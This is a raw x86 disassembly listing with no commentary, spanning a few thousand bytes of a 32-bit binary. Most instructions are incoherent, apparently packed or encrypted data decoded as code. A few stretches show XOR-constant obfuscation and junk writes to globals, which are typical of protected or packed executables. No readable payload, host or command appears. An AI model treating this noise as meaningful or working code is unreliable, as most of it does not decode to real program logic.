  40a364:	loop   0x40a374
  40a366:	mov    dl,0x71
  40a368:	dec    esp
  40a369:	cli    
  40a36a:	jb     0x40a348
  40a36c:	ret    
  40a36d:	js     0x40a337
  40a36f:	xor    DWORD PTR [ebp+0x732d0a5e],0xffffffac
  40a376:	mov    dh,al
  40a378:	pop    ecx
  40a379:	mov    bl,0x9d
  40a37b:	int3   
  40a37c:	mov    WORD PTR [eax],gs
  40a37e:	push   ebp
  40a37f:	fidivr DWORD PTR [ecx+0x3966ba9e]
  40a385:	jle    0x40a3f6
  40a387:	sbb    al,0x1d
  40a389:	pop    ss
  40a38a:	ins    DWORD PTR es:[edi],dx
  40a38b:	sub    bl,cl
  40a38d:	fisub  DWORD PTR [ebx]
  40a38f:	mov    eax,ds:0x283395a0
  40a394:	pop    es
  40a395:	xchg   esp,eax
  40a396:	jnp    0x40a363
  40a398:	and    eax,0x645f9125
  40a39d:	xor    eax,0x9e1618c8
  40a3a2:	mov    bh,0xec
  40a3a4:	xchg   esp,ebp
  40a3a6:	rcl    DWORD PTR [edi],1
  40a3a8:	popa   
  40a3a9:	arpl   WORD PTR [esi+0x7490632b],sp
  40a3af:	sub    eax,0xb5b43fa5
  40a3b4:	lods   eax,DWORD PTR ds:[esi]
  40a3b5:	dec    ebx
  40a3b6:	inc    edi
  40a3b7:	lds    edx,FWORD PTR [ecx]
  40a3b9:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40a3ba:	push   eax
  40a3bb:	xor    BYTE PTR [ebp-0x2f],dl
  40a3be:	mov    ebx,0xd942e98b
  40a3c3:	lahf   
  40a3c4:	adc    BYTE PTR [edi-0x43],0x68
  40a3c8:	loop   0x40a448
  40a3ca:	retf   0xdfa6
  40a3cd:	dec    ebx
  40a3ce:	jle    0x40a43e
  40a3d0:	mov    ah,0xa9
  40a3d2:	mov    DWORD PTR [ebp+0x3e],edi
  40a3d5:	pop    edi
  40a3d6:	ja     0x40a367
  40a3d8:	(bad)  
  40a3d9:	loopne 0x40a44c
  40a3db:	sbb    BYTE PTR [edi-0x7e4f99a5],bh
  40a3e1:	sbb    DWORD PTR [eax-0x6c5b1ea1],ebp
  40a3e7:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40a3e8:	adc    eax,0x67b8acbd
  40a3ed:	adc    DWORD PTR [ebx+0x5d],edi
  40a3f0:	arpl   WORD PTR [ebx-0x1382f428],dx
  40a3f6:	and    esi,0xec9b241e
  40a3fc:	div    DWORD PTR [ecx+0x73356ac8]
  40a402:	add    edx,ecx
  40a404:	sbb    al,0x26
  40a406:	repnz pushf 
  40a408:	xor    BYTE PTR [eax],ch
  40a40a:	rol    ch,0x64
  40a40d:	sahf   
  40a40e:	fistp  QWORD PTR [eax]
  40a410:	(bad)  
  40a411:	(bad)  
  40a412:	pop    ebx
  40a413:	and    BYTE PTR [ebx],cl
  40a415:	dec    esi
  40a416:	dec    esi
  40a417:	jns    0x40a412
  40a419:	cmp    ebp,DWORD PTR [ecx+0x13]
  40a41c:	mov    dl,BYTE PTR [eax]
  40a41e:	or     al,0xc0
  40a420:	push   ss
  40a421:	shr    ebx,0xb9
  40a424:	xchg   ebx,eax
  40a425:	xchg   ecx,eax
  40a426:	out    0x83,eax
  40a428:	rol    BYTE PTR [ebx-0x6a],cl
  40a42b:	and    al,0x62
  40a42d:	mov    ah,0xb3
  40a42f:	pop    esi
  40a430:	jmp    0xbe160497
  40a435:	sbb    eax,0x210318f3
  40a43a:	icebp  
  40a43b:	mov    edi,0x2ff8bbee
  40a440:	lock fwait
  40a442:	xchg   ecx,esp
  40a444:	fwait
  40a445:	fwait
  40a446:	push   cs
  40a447:	out    dx,al
  40a448:	fcmovbe st,st(4)
  40a44a:	add    al,0xbd
  40a44c:	aad    0xc1
  40a44e:	hlt    
  40a44f:	xor    al,0xec
  40a451:	xlat   BYTE PTR ds:[ebx]
  40a452:	div    DWORD PTR [eax+0x546c377a]
  40a458:	dec    ebx
  40a459:	adc    al,0xb6
  40a45b:	pop    esi
  40a45c:	and    ebp,DWORD PTR [edi-0x2]
  40a45f:	ins    BYTE PTR es:[edi],dx
  40a460:	add    BYTE PTR [edi-0x42a24264],dl
  40a466:	in     al,0xc8
  40a468:	ja     0x40a46c
  40a46a:	or     DWORD PTR [ebx-0x17f594c2],0xffffffa5
  40a471:	inc    edi
  40a472:	icebp  
  40a473:	iret   
  40a474:	fistp  QWORD PTR [esi]
  40a476:	mov    bl,0xb
  40a478:	fwait
  40a479:	inc    eax
  40a47a:	xor    esp,DWORD PTR ds:0x173e7c5f
  40a480:	loop   0x40a4a4
  40a482:	mov    al,ds:0x28d77ce2
  40a487:	dec    esi
  40a488:	add    eax,0xf1b09b0e
  40a48d:	mov    eax,ds:0x2e45ad5
  40a492:	jecxz  0x40a460
  40a494:	scas   eax,DWORD PTR es:[edi]
  40a495:	aam    0x2
  40a497:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40a498:	mov    ?,esi
  40a49a:	cmp    dh,BYTE PTR [edi+0x69e9a598]
  40a4a0:	pop    edx
  40a4a1:	rcl    BYTE PTR [edi+ecx*2+0x5a],cl
  40a4a5:	sar    DWORD PTR [ebx],0x1b
  40a4a8:	adc    BYTE PTR [esi-0x37],dh
  40a4ab:	fsub   QWORD PTR [esi-0x5208db8e]
  40a4b1:	mov    ch,0xa8
  40a4b3:	out    dx,eax
  40a4b4:	push   esi
  40a4b5:	test   al,0x96
  40a4b7:	push   esi
  40a4b8:	inc    eax
  40a4b9:	popa   
  40a4ba:	in     eax,dx
  40a4bb:	dec    edx
  40a4bc:	loop   0x40a51e
  40a4be:	aas    
  40a4bf:	shr    ch,cl
  40a4c1:	mov    cl,0x9e
  40a4c3:	ret    0x5490
  40a4c6:	ds cmp ebp,ebp
  40a4c9:	repnz mov esi,0x415ff33c
  40a4cf:	add    eax,0x30b545
  40a4d4:	loopne 0x40a488
  40a4d6:	call   0x6f45:0x20849c18
  40a4dd:	bound  ecx,QWORD PTR [edx-0xf]
  40a4e0:	stos   DWORD PTR es:[edi],eax
  40a4e1:	outs   dx,DWORD PTR ds:[esi]
  40a4e2:	push   ds
  40a4e3:	aaa    
  40a4e4:	aaa    
  40a4e5:	jle    0x40a488
  40a4e7:	add    edi,ecx
  40a4e9:	add    BYTE PTR [esi],bl
  40a4eb:	add    BYTE PTR [ebx-0x4ef6cbf],bh
  40a4f1:	add    al,0x9e
  40a4f3:	pop    es
  40a4f4:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40a4f5:	call   0x416c20
  40a4fa:	mov    eax,DWORD PTR [esi]
  40a4fc:	mov    ecx,DWORD PTR [esi+0x4]
  40a4ff:	shrd   eax,ecx,0x2
  40a503:	shr    ecx,0x2
  40a506:	shr    edx,0x1e
  40a509:	xor    ecx,0xe706e27a
  40a50f:	push   ecx
  40a510:	xor    eax,edi
  40a512:	jmp    0x40a8f0
  40a517:	sbb    al,0x3d
  40a519:	jmp    0x40a4ee
  40a51b:	jmp    0x9189:0x511a1c23
  40a522:	jo     0x40a4b9
  40a524:	bound  eax,QWORD PTR [ecx-0x42]
  40a527:	fsubr  DWORD PTR [ebx]
  40a529:	sbb    BYTE PTR [eax],bl
  40a52b:	sahf   
  40a52c:	adc    bl,BYTE PTR [eax]
  40a52e:	sbb    al,dl
  40a530:	xor    ch,BYTE PTR [esi-0x78ee850a]
  40a536:	pop    ecx
  40a537:	add    eax,DWORD PTR [edi+0x7110643d]
  40a53d:	(bad)  
  40a53e:	sub    ebx,eax
  40a540:	push   cs
  40a541:	mov    dl,0x63
  40a543:	cs dec eax
  40a545:	pop    ds
  40a546:	dec    eax
  40a547:	push   ebp
  40a548:	clc    
  40a549:	and    edx,DWORD PTR [esi+0x5c85c6dc]
  40a54f:	push   ds
  40a550:	mov    esp,DWORD PTR [eax+0x30]
  40a553:	mov    cl,0xda
  40a555:	mov    eax,ds:0x40e13f34
  40a55a:	mov    esi,0x2b339f35
  40a55f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40a560:	or     DWORD PTR ds:0xb9f154e4,0x76dd6747
  40a56a:	xchg   DWORD PTR [ebp+0x4423b887],eax
  40a570:	sti    
  40a571:	jnp    0x40a5da
  40a573:	cli    
  40a574:	pushf  
  40a575:	cmp    al,0x99
  40a577:	and    DWORD PTR [bp-0x8be],ebp
  40a57c:	sub    BYTE PTR [edi+0x7a],ah
  40a57f:	nop
  40a580:	idiv   BYTE PTR [eax+0x7]
  40a583:	enter  0xb0ee,0x7d
  40a587:	cmp    al,0xeb
  40a589:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40a58a:	test   eax,0xa24ca89
  40a58f:	pop    edx
  40a590:	dec    edi
  40a591:	pop    es
  40a592:	cmp    ah,BYTE PTR [ebp-0x2a]
  40a595:	adc    al,0x16
  40a597:	rcl    BYTE PTR [edi],0x23
  40a59a:	and    ah,BYTE PTR [ebp-0x162e1be8]
  40a5a0:	add    eax,0x780f7080
  40a5a5:	pop    ds
  40a5a6:	dec    esi
  40a5a7:	sub    bl,BYTE PTR [ecx]
  40a5a9:	jnp    0x40a5e0
  40a5ab:	lock dec edi
  40a5ad:	adc    eax,0x9e287260
  40a5b2:	dec    DWORD PTR [ebp-0x52]
  40a5b5:	fwait
  40a5b6:	inc    ebp
  40a5b7:	pop    edx
  40a5b8:	push   ss
  40a5b9:	mov    ch,0xc3
  40a5bb:	es cmp ch,dh
  40a5be:	push   ss
  40a5bf:	inc    edi
  40a5c0:	mov    eax,0xbd51bca8
  40a5c5:	pop    esi
  40a5c6:	(bad)  
  40a5c7:	mov    WORD PTR [eax-0x2352cf1e],ds
  40a5cd:	fwait
  40a5ce:	add    eax,0xd00aa3c0
  40a5d3:	and    BYTE PTR [eax-0x56],bh
  40a5d6:	aad    0x9c
  40a5d8:	mov    BYTE PTR [edi+0x63],bh
  40a5db:	adc    al,0x1d
  40a5dd:	push   ecx
  40a5de:	mov    bh,0x2b
  40a5e0:	aas    
  40a5e1:	mov    dl,0x6c
  40a5e3:	push   ds
  40a5e4:	out    dx,eax
  40a5e5:	aam    0x1f
  40a5e7:	jl     0x40a5e2
  40a5e9:	aaa    
  40a5ea:	or     eax,0x1c4e74b2
  40a5ef:	idiv   DWORD PTR [edx-0x5a29d807]
  40a5f5:	clc    
  40a5f6:	mov    BYTE PTR [ebx-0x1b268b02],al
  40a5fc:	sbb    eax,0xa1210354
  40a601:	mov    WORD PTR [esi+eiz*4],ss
  40a604:	push   ds
  40a605:	dec    esp
  40a606:	in     al,0xcc
  40a608:	jmp    0x40a602
  40a60a:	inc    edi
  40a60b:	pop    ss
  40a60c:	rcr    BYTE PTR [esi],cl
  40a60e:	add    eax,edx
  40a610:	enter  0x4ad0,0x7
  40a614:	xchg   ebp,eax
  40a615:	xchg   ebp,eax
  40a616:	push   es
  40a617:	mov    BYTE PTR [ecx-0x2a68149d],ah
  40a61d:	adc    eax,0x2ba96dfa
  40a622:	ror    BYTE PTR [esi],cl
  40a624:	std    
  40a625:	stc    
  40a626:	push   esp
  40a627:	pusha  
  40a628:	rcr    BYTE PTR [edx+0x10],0xa5
  40a62c:	xchg   ecx,eax
  40a62d:	sbb    ch,BYTE PTR [edx+0x6b148cfc]
  40a633:	mov    DWORD PTR [eax-0x2b50f009],edx
  40a639:	imul   eax,DWORD PTR [esi+0x1eaff9f4],0xc04b2402
  40a643:	ss (bad) 
  40a645:	cld    
  40a646:	or     al,0xb0
  40a648:	jb     0x40a5df
  40a64a:	(bad)  
  40a64b:	lods   al,BYTE PTR ds:[esi]
  40a64c:	ds sbb al,0x3e
  40a64f:	mov    BYTE PTR [esp+ecx*8+0x21],ah
  40a653:	outs   dx,BYTE PTR ds:[esi]
  40a654:	or     dh,BYTE PTR [edx+0x5edf4e1d]
  40a65a:	mov    esp,0x4f51eb8a
  40a65f:	cwde   
  40a660:	jmp    0xdcc2fcba
  40a665:	fcom   DWORD PTR [ebx]
  40a667:	int    0xe5
  40a669:	mov    bl,cl
  40a66b:	adc    eax,0x6ffbbfcc
  40a670:	inc    ecx
  40a671:	jg     0x40a682
  40a673:	loopne 0x40a68e
  40a675:	sbb    al,0x36
  40a677:	les    edx,FWORD PTR [esi]
  40a679:	(bad)  
  40a67a:	sbb    al,0xbb
  40a67c:	lock adc eax,0x7a0b0a02
  40a682:	stos   DWORD PTR es:[edi],eax
  40a683:	or     eax,0x1129e764
  40a688:	pop    esp
  40a689:	mov    ds,WORD PTR [eax]
  40a68b:	imul   esi,DWORD PTR [edi-0x3a1b338],0x3b
  40a692:	xchg   esi,eax
  40a693:	scas   eax,DWORD PTR es:[edi]
  40a694:	jl     0x40a6f4
  40a696:	stos   BYTE PTR es:[edi],al
  40a697:	mov    ds:0x29748f09,al
  40a69c:	out    0xff,eax
  40a69e:	add    esi,DWORD PTR [ebp-0x41]
  40a6a1:	rol    DWORD PTR [ecx],0xc5
  40a6a4:	rcl    BYTE PTR [ecx+0x3b7d9288],cl
  40a6aa:	adc    DWORD PTR [ebp-0x27d7a2ea],edx
  40a6b0:	mov    esp,0x9f3d1dde
  40a6b5:	clc    
  40a6b6:	adc    al,0x3
  40a6b8:	sub    eax,0x51d89e64
  40a6bd:	jecxz  0x40a66b
  40a6bf:	or     BYTE PTR [ecx-0x5c3c3e59],al
  40a6c5:	fsubr  DWORD PTR [ebx+0x57]
  40a6c8:	jns    0x40a691
  40a6ca:	xchg   ebx,eax
  40a6cb:	retf   
  40a6cc:	into   
  40a6cd:	and    DWORD PTR [edi+0x65f1a552],esi
  40a6d3:	dec    ebx
  40a6d4:	cmp    al,BYTE PTR [ebx]
  40a6d6:	(bad)  
  40a6d7:	in     al,0x7
  40a6d9:	test   BYTE PTR [edi],dl
  40a6db:	cmp    BYTE PTR [ebp+0x3a98222e],0xeb
  40a6e2:	aas    
  40a6e3:	or     BYTE PTR gs:[ecx],bl
  40a6e6:	pop    edi
  40a6e7:	(bad)  
  40a6e8:	outs   dx,BYTE PTR ds:[esi]
  40a6e9:	fimul  WORD PTR [eax-0x23595d1e]
  40a6ef:	adc    DWORD PTR [edx],ecx
  40a6f1:	push   ebx
  40a6f2:	mov    dl,0x49
  40a6f4:	mov    ch,0xbf
  40a6f6:	enter  0x895a,0xf6
  40a6fa:	in     al,0x59
  40a6fc:	stos   BYTE PTR es:[edi],al
  40a6fd:	pop    ss
  40a6fe:	cmp    esp,DWORD PTR [ebx+0x61250950]
  40a704:	mov    ss,WORD PTR [edi+0x5]
  40a707:	and    edx,0xb614991b
  40a70d:	nop
  40a70e:	mov    BYTE PTR [edi+0x61],bl
  40a711:	jecxz  0x40a75e
  40a713:	pop    edi
  40a714:	pop    esi
  40a715:	call   0x6a860714
  40a71a:	aad    0x76
  40a71c:	sbb    BYTE PTR [ebp+0x34],bh
  40a71f:	mov    ch,0xa2
  40a721:	sar    BYTE PTR [ebx-0x4e],1
  40a724:	dec    ecx
  40a725:	push   eax
  40a726:	xchg   ecx,eax
  40a727:	jmp    DWORD PTR [edi+0x7c2269e8]
  40a72d:	push   esi
  40a72e:	aaa    
  40a72f:	ret    
  40a730:	dec    ebp
  40a731:	pop    ss
  40a732:	sub    BYTE PTR [eax+ecx*4],dh
  40a735:	add    DWORD PTR fs:[ebp-0x40398433],0xcb720274
  40a740:	pop    edx
  40a741:	pop    ecx
  40a742:	pushf  
  40a743:	cmp    ah,BYTE PTR [ebx+ebx*4]
  40a746:	std    
  40a747:	jmp    0x21e69857
  40a74c:	(bad)  
  40a74d:	pop    ebx
  40a74e:	data16 mov al,ds:0x6d5ae6cb
  40a754:	shr    DWORD PTR ds:0xafdb6493,cl
  40a75a:	mov    ds:0x93e8cd5,eax
  40a75f:	loope  0x40a7b6
  40a761:	(bad)  
  40a762:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40a763:	jmp    0xfd6e:0xec0a40ec
  40a76a:	iret   
  40a76b:	mov    eax,ds:0xf3e024ea
  40a770:	(bad)  
  40a771:	and    BYTE PTR [ebx-0x6c],al
  40a774:	fsubp  st(1),st
  40a776:	jl     0x40a7c3
  40a778:	push   0x9733bfac
  40a77d:	and    al,0x9a
  40a77f:	out    dx,al
  40a780:	fcmovbe st,st(4)
  40a782:	in     al,0x67
  40a784:	dec    esi
  40a785:	addr16 retf 
  40a787:	sbb    DWORD PTR [eax-0x52afcf53],edx
  40a78d:	lds    eax,FWORD PTR [ecx+0x194b8636]
  40a793:	mov    ah,0x7b
  40a795:	imul   esp,DWORD PTR [eax-0x14508632],0x235fdd84
  40a79f:	mov    ebx,0xaea3eee0
  40a7a4:	or     BYTE PTR ds:0x9d3954c8,dl
  40a7aa:	mov    dh,0xc1
  40a7ac:	xchg   esp,eax
  40a7ad:	jb     0x40a7f2
  40a7af:	mov    eax,DWORD PTR [esi]
  40a7b1:	mov    al,0x38
  40a7b3:	outs   dx,BYTE PTR ds:[esi]
  40a7b4:	sbb    BYTE PTR [ebx-0x6a],cl
  40a7b7:	push   edx
  40a7b8:	or     BYTE PTR [ecx],cl
  40a7ba:	dec    ebx
  40a7bb:	xchg   ch,bh
  40a7bd:	inc    ecx
  40a7be:	mov    edx,es
  40a7c0:	ins    DWORD PTR es:[edi],dx
  40a7c1:	jb     0x40a828
  40a7c3:	and    BYTE PTR [eax+0x8],bl
  40a7c6:	add    cl,ah
  40a7c8:	or     eax,0x93a08d9a
  40a7cd:	ret    
  40a7ce:	iret   
  40a7cf:	cmp    ch,BYTE PTR [esi+0x70841f6b]
  40a7d5:	push   ebx
  40a7d6:	dec    esi
  40a7d7:	icebp  
  40a7d8:	loop   0x40a7ee
  40a7da:	jne    0x40a7bd
  40a7dc:	sti    
  40a7dd:	out    0xa3,eax
  40a7df:	lds    esp,FWORD PTR [esi+0x65d291e1]
  40a7e5:	rcl    BYTE PTR [esi+0x6ee5157e],1
  40a7eb:	push   0xffffffe7
  40a7ed:	mov    ebx,0x7894954
  40a7f2:	dec    edx
  40a7f3:	add    edx,eax
  40a7f5:	adc    BYTE PTR [esi+0x7f4ddc2c],ch
  40a7fb:	lds    eax,FWORD PTR [esi+eax*2+0x227b5726]
  40a802:	adc    cl,bl
  40a804:	mov    ecx,0xe43822a2
  40a809:	inc    esi
  40a80a:	int    0xb9
  40a80c:	shl    BYTE PTR [edx],cl
  40a80e:	mov    edi,0x38d5890c
  40a813:	and    BYTE PTR [edi],cl
  40a815:	cmp    ebp,0x3f
  40a818:	inc    ebp
  40a819:	jne    0x40a7f6
  40a81b:	sub    al,0xf3
  40a81d:	stc    
  40a81e:	add    al,0xd5
  40a820:	sbb    DWORD PTR [edx],ecx
  40a822:	jmp    0x38d4:0x290c9486
  40a829:	mov    esp,0xb6753ce5
  40a82e:	in     eax,0xd5
  40a830:	call   0x89e9f281
  40a835:	inc    ebx
  40a836:	call   FWORD PTR [ebx]
  40a838:	mov    ebp,0x64d06f8c
  40a83d:	dec    esp
  40a83e:	ins    DWORD PTR es:[edi],dx
  40a83f:	or     ah,BYTE PTR [eax+0x10]
  40a842:	js     0x40a8af
  40a844:	in     al,0x87
  40a846:	mov    esp,0x6c01e77b
  40a84b:	cmp    BYTE PTR [esi-0xf],cl
  40a84e:	mov    eax,0x926e21ef
  40a853:	adc    al,0x38
  40a855:	xchg   ebp,eax
  40a856:	(bad)  
  40a857:	mov    dh,0xf7
  40a859:	jmp    0x4e8b:0x2e3a098d
  40a860:	jne    0x40a80b
  40a862:	int3   
  40a863:	push   ss
  40a864:	mov    ecx,0x136044e2
  40a869:	or     al,0x42
  40a86b:	hlt    
  40a86c:	test   al,0x72
  40a86e:	xchg   esi,eax
  40a86f:	push   esp
  40a870:	repz imul DWORD PTR [ecx+0x1a41314f]
  40a877:	sub    esp,DWORD PTR [edi]
  40a879:	pop    ss
  40a87a:	repz mov edi,0x7212ae82
  40a880:	xlat   BYTE PTR ds:[ebx]
  40a881:	fwait
  40a882:	lods   al,BYTE PTR ds:[esi]
  40a883:	push   ss
  40a884:	fucomi st,st(0)
  40a886:	mov    WORD PTR [edi-0x46a62b21],?
  40a88c:	push   0x69
  40a88e:	adc    BYTE PTR ds:0x59e47c63,ch
  40a894:	in     al,dx
  40a895:	(bad)  
  40a896:	out    0x2a,eax
  40a898:	xor    al,0xb8
  40a89a:	mov    ch,0x9d
  40a89c:	lock jae 0x40a8f6
  40a89f:	cli    
  40a8a0:	jno    0x40a850
  40a8a2:	scas   al,BYTE PTR es:[edi]
  40a8a3:	lds    ebp,FWORD PTR [ecx+0x3c]
  40a8a6:	into   
  40a8a7:	ds or  al,0x71
  40a8aa:	pop    eax
  40a8ab:	mov    al,ds:0xdd17f817
  40a8b0:	xor    esp,DWORD PTR [ecx+0x1c]
  40a8b3:	sar    BYTE PTR [ebx+0x401de2ba],1
  40a8b9:	jl     0x40a905
  40a8bb:	adc    DWORD PTR [edx],0x70
  40a8be:	inc    ebp
  40a8bf:	adc    ch,dh
  40a8c1:	cld    
  40a8c2:	ror    bl,0xf9
  40a8c5:	fwait
  40a8c6:	sub    al,0x9b
  40a8c8:	popa   
  40a8c9:	call   0xdc27ac22
  40a8ce:	repz jmp 0x40a93e
  40a8d1:	js     0x40a87d
  40a8d3:	jae    0x40a909
  40a8d5:	mov    dh,0x67
  40a8d7:	and    BYTE PTR [edx+0x467033ee],0x7a
  40a8de:	xor    dl,ch
  40a8e0:	lods   al,BYTE PTR ds:[esi]
  40a8e1:	rcl    BYTE PTR [ebp-0x20],cl
  40a8e4:	add    DWORD PTR [ecx+edi*1],esp
  40a8e7:	or     eax,0xf7532254
  40a8ec:	xor    DWORD PTR [ebx],edx
  40a8ee:	jb     0x40a963
  40a8f0:	mov    DWORD PTR [ebp+0x10],edx
  40a8f3:	mov    edx,DWORD PTR [ebx]
  40a8f5:	mov    edi,DWORD PTR [ebx+0x4]
  40a8f8:	push   eax
  40a8f9:	push   edi
  40a8fa:	push   edx
  40a8fb:	call   0x416c20
  40a900:	shld   edx,eax,0x2
  40a904:	shl    eax,0x2
  40a907:	mov    ecx,eax
  40a909:	or     ecx,DWORD PTR [ebp+0x10]
  40a90c:	xor    eax,eax
  40a90e:	or     edx,eax
  40a910:	xor    ecx,0xca79a575
  40a916:	xor    edx,0x9c1b89e8
  40a91c:	mov    DWORD PTR [esi],ecx
  40a91e:	mov    DWORD PTR [esi+0x4],edx
  40a921:	mov    eax,0x40000000
  40a926:	mov    edx,DWORD PTR [ebx]
  40a928:	mov    ecx,DWORD PTR [ebx+0x4]
  40a92b:	xor    edx,0xca79a577
  40a931:	xor    ecx,0x9c1b89e8
  40a937:	shrd   edx,ecx,0x2
  40a93b:	shr    ecx,0x2
  40a93e:	mov    DWORD PTR [ebp-0x6c],ecx
  40a941:	mov    ecx,DWORD PTR [ebx]
  40a943:	mov    edi,DWORD PTR [ebx+0x4]
  40a946:	mov    edi,ecx
  40a948:	xor    ecx,ecx
  40a94a:	or     ecx,edx
  40a94c:	mov    DWORD PTR [ebp+0x8],ecx
  40a94f:	mov    ecx,DWORD PTR [esi]
  40a951:	mov    edx,DWORD PTR [esi+0x4]
  40a954:	xor    edx,0x9c1b89e8
  40a95a:	xor    ecx,0xca79a577
  40a960:	shl    edi,0x1e
  40a963:	mov    DWORD PTR [ebp+0x14],ecx
  40a966:	mov    ecx,edx
  40a968:	mov    edx,DWORD PTR [ebp+0x14]
  40a96b:	shrd   edx,ecx,0x2
  40a96f:	xor    edi,eax
  40a971:	or     edi,DWORD PTR [ebp-0x6c]
  40a974:	mov    DWORD PTR [ebp-0x70],edx
  40a977:	mov    edx,DWORD PTR [esi]
  40a979:	mov    DWORD PTR [ebp+0xc],edi
  40a97c:	mov    edi,DWORD PTR [esi+0x4]
  40a97f:	shl    edx,0x1e
  40a982:	xor    edi,edi
  40a984:	or     edi,DWORD PTR [ebp-0x70]
  40a987:	shr    ecx,0x2
  40a98a:	xor    edx,eax
  40a98c:	or     edx,ecx
  40a98e:	cmp    edi,DWORD PTR [ebp+0x8]
  40a991:	jne    0x40a9a0
  40a997:	cmp    edx,DWORD PTR [ebp+0xc]
  40a99a:	je     0x40a9b0
  40a9a0:	push   DWORD PTR [ebp+0x20]
  40a9a3:	push   DWORD PTR [ebp+0x1c]
  40a9a6:	push   DWORD PTR [ebp+0x18]
  40a9a9:	push   ebx
  40a9aa:	push   esi
  40a9ab:	call   0x414dd5
  40a9b0:	pop    edi
  40a9b1:	leave  
  40a9b2:	ret    0x1c
  40a9b5:	cmp    cl,0x40
  40a9b8:	mov    DWORD PTR ds:0x428343,0x3afd
  40a9c2:	jae    0x40aa0b
  40a9c8:	mov    DWORD PTR ds:0x428337,0x7b96
  40a9d2:	cmp    cl,0x20
  40a9d5:	mov    DWORD PTR ds:0x428293,0x3ad8
  40a9df:	jae    0x40a9fb
  40a9e5:	mov    DWORD PTR ds:0x42833b,0x760a
  40a9ef:	shrd   eax,edx,cl
  40a9f2:	not    DWORD PTR ds:0x4282c3
  40a9f8:	shr    edx,cl
  40a9fa:	ret    
  40a9fb:	add    DWORD PTR ds:0x4282b7,ecx
  40aa01:	mov    eax,edx
  40aa03:	xor    edx,edx
  40aa05:	and    cl,0x1f
  40aa08:	shr    eax,cl
  40aa0a:	ret    
  40aa0b:	xor    eax,eax
  40aa0d:	xor    edx,edx
  40aa0f:	ret    
  40aa10:	push   ebp
  40aa11:	mov    ebp,esp
  40aa13:	sub    esp,0x30
  40aa16:	mov    DWORD PTR [ebp-0x18],0xca79a575
  40aa1d:	xor    ecx,ecx
  40aa1f:	mov    eax,0x9c1b89e8
  40aa24:	mov    DWORD PTR [ebp-0x14],eax
  40aa27:	not    ecx
  40aa29:	mov    DWORD PTR [ebp-0x30],0xca79a571
  40aa30:	dec    DWORD PTR ds:0x428333
  40aa36:	mov    DWORD PTR [ebp-0x2c],eax
  40aa39:	mov    DWORD PTR [ebp-0x28],0xae8f94a8
  40aa40:	mov    ecx,DWORD PTR ds:0x42826b
  40aa46:	sbb    DWORD PTR ds:0x4281ab,ecx
  40aa4c:	mov    DWORD PTR [ebp-0x24],0x29bd2
  40aa53:	jmp    0x40ae49
  40aa58:	clc    
  40aa59:	sub    dh,BYTE PTR [edx+0x306b2a6b]
  40aa5f:	sub    bh,BYTE PTR ds:0x87e1f6a
  40aa65:	pop    ds
  40aa66:	in     eax,0xaa
  40aa68:	pop    edi
  40aa69:	and    ebx,DWORD PTR [eax]
  40aa6b:	sbb    BYTE PTR [esi+0x12],ch
  40aa6e:	sbb    BYTE PTR [eax],bl
  40aa70:	add    DWORD PTR [ebp+0x3b],eax
  40aa73:	sub    ebp,eax
  40aa75:	es sub eax,0x168737e5
  40aa7b:	adc    edi,DWORD PTR [ebp+esi*8+0x57]
  40aa7f:	in     eax,dx
  40aa80:	dec    ebx
  40aa81:	in     al,dx
  40aa82:	(bad)  
  40aa83:	imul   esp,DWORD PTR [ecx],0xffffffb0
  40aa86:	pop    ecx
  40aa87:	test   eax,0xa62d058b
  40aa8c:	mov    cl,0x36
  40aa8e:	adc    al,0xbf
  40aa90:	xchg   di,ax
  40aa92:	repnz inc eax
  40aa94:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40aa95:	(bad)  
  40aa96:	dec    edi
  40aa97:	ins    BYTE PTR es:[edi],dx
  40aa98:	popa   
  40aa99:	(bad)  
  40aa9a:	mov    esi,0x65323bc0
  40aa9f:	sbb    al,0x89
  40aaa1:	sub    BYTE PTR ds:0xc840b159,bh
  40aaa7:	enter  0xe09d,0x81
  40aaab:	xchg   ebp,eax
  40aaac:	(bad)  
  40aaad:	imul   eax,DWORD PTR [ebx+ecx*4],0x46fd6de4
  40aab4:	aas    
  40aab5:	pop    es
  40aab6:	retf   0x343
  40aab9:	retf   0x194f
  40aabc:	repnz cmp DWORD PTR [esi],eax
  40aabf:	dec    edi
  40aac0:	push   ss
  40aac1:	popa   
  40aac2:	inc    eax
  40aac3:	sbb    BYTE PTR ds:0xf15cbfbc,ch
  40aac9:	jae    0x40aa65
  40aacb:	sahf   
  40aacc:	imul   ebp,DWORD PTR [ecx-0x7f455c1d],0x485c1ff9
  40aad6:	push   cs
  40aad7:	jge    0x40aa60
  40aad9:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40aada:	add    DWORD PTR [ecx],esi
  40aadc:	and    BYTE PTR ds:0x6635ef1c,bh
  40aae2:	pop    ds
  40aae3:	mov    al,BYTE PTR [ecx-0x394a63ad]
  40aae9:	in     eax,dx
  40aaea:	ins    BYTE PTR es:[edi],dx
  40aaeb:	fcmovnu st,st(6)
  40aaed:	pop    esi
  40aaee:	gs or  bh,dh
  40aaf1:	cwde   
  40aaf2:	cmp    ch,al
  40aaf4:	cmp    BYTE PTR [ecx],dh
  40aaf6:	arpl   WORD PTR [ebx+ebp*1],di
  40aaf9:	adc    eax,0x3440bbcc
  40aafe:	jecxz  0x40aa94
  40ab00:	pushf  
  40ab01:	pushf  
  40ab02:	xor    DWORD PTR [ebp-0x14],0x383bd40f
  40ab09:	test   ecx,ebp
  40ab0b:	fbstp  TBYTE PTR [ebp+0x2d]
  40ab0e:	hlt    
  40ab0f:	test   DWORD PTR [ebp+edi*1+0x50],ebp
  40ab13:	and    al,0x27
  40ab15:	mov    edx,0x8d64572e
  40ab1a:	dec    ebp
  40ab1b:	addr16 cmp al,0x3e
  40ab1e:	scas   al,BYTE PTR es:[edi]
  40ab1f:	sbb    cl,al
  40ab21:	xchg   BYTE PTR [ebp-0x18],bl
  40ab24:	iret   
  40ab25:	(bad)  
  40ab26:	repnz in al,dx
  40ab28:	lahf   
  40ab29:	mov    al,ah
  40ab2b:	jecxz  0x40ab7c
  40ab2d:	sub    BYTE PTR [ebx+0x243a83c9],ch
